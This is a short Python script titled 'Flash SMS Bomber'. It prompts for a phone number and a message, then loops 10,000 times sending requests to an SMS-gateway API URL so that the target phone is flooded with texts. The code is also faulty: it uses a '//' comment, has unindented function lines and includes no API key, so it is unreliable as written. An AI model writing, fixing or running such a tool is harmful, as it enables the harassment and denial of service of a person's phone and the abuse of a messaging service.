//Flash SMS Bomber code

import requests

def flashsms():
num = input("Enter the phone number: ")
msg = input("Enter the message to send: ")

for i in range(10000):
  res = requests.get(f"https://api.textlocal.in/send/?phone={num}&message={msg}{i}")

flashsms()